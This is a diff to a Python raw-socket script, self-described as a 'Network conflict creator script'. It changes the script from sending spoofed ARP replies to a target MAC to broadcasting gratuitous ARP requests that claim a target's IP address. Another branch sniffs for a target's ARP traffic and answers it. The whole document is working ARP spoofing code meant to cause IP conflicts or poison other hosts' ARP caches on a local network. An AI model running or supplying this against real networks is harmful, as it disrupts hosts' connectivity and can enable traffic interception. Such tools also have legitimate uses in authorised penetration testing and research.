@@ -26,7 +26,7 @@ parser = ArgumentParser(description='Network conflict creator script')
 parser.add_argument('-i', '--interface', type=str, help='Set interface name for listen and send packets')
 parser.add_argument('-p', '--packets', type=int, help='Number of packets (default: 10)', default=10)
 parser.add_argument('-t', '--target_mac', type=str, help='Set target MAC address', default=None)
-parser.add_argument('-I', '--target_ip', type=str, help='Set target MAC address', default=None)
+parser.add_argument('-T', '--target_ip', type=str, help='Set target MAC address', default=None)
 parser.add_argument('-q', '--quiet', action='store_true', help='Minimal output')
 
 args = parser.parse_args()
@@ -91,20 +91,16 @@ if __name__ == "__main__":
             sniff(lfilter=lambda d: d.src == _target_mac_address,
                   filter="arp", prn=send_arp_reply, iface=_current_network_interface)
     else:
-        if _target_mac_address is None:
-            print Base.c_error + "Please set target MAC address!"
-            exit(0)
-
-        Base.print_info("Sending " + str(_number_of_packets) + " ARP reply to MAC: ", _target_mac_address,
-                        " IP: ", _target_ip_address, " ...")
+        Base.print_info("Sending ", str(_number_of_packets), " Gratuitous ARP requests to broadcast MAC address, " +
+                        "sender and target IP address: ", _target_ip_address)
 
         SOCK = socket(AF_PACKET, SOCK_RAW)
         SOCK.bind((_current_network_interface, 0))
 
-        arp_reply = _arp.make_response(ethernet_src_mac=_current_mac_address, ethernet_dst_mac=_target_mac_address,
-                                       sender_mac=_current_mac_address, sender_ip=_target_ip_address,
-                                       target_mac="ff:ff:ff:ff:ff:ff", target_ip="0.0.0.0")
+        arp_request = _arp.make_request(ethernet_src_mac=_current_mac_address, ethernet_dst_mac="ff:ff:ff:ff:ff:ff",
+                                        sender_mac=_current_mac_address, sender_ip=_target_ip_address,
+                                        target_mac="00:00:00:00:00:00", target_ip=_target_ip_address)
         for _ in range(_number_of_packets):
-            SOCK.send(arp_reply)
-            sleep(0.1)
+            SOCK.send(arp_request)
+            sleep(0.5)
         SOCK.close()
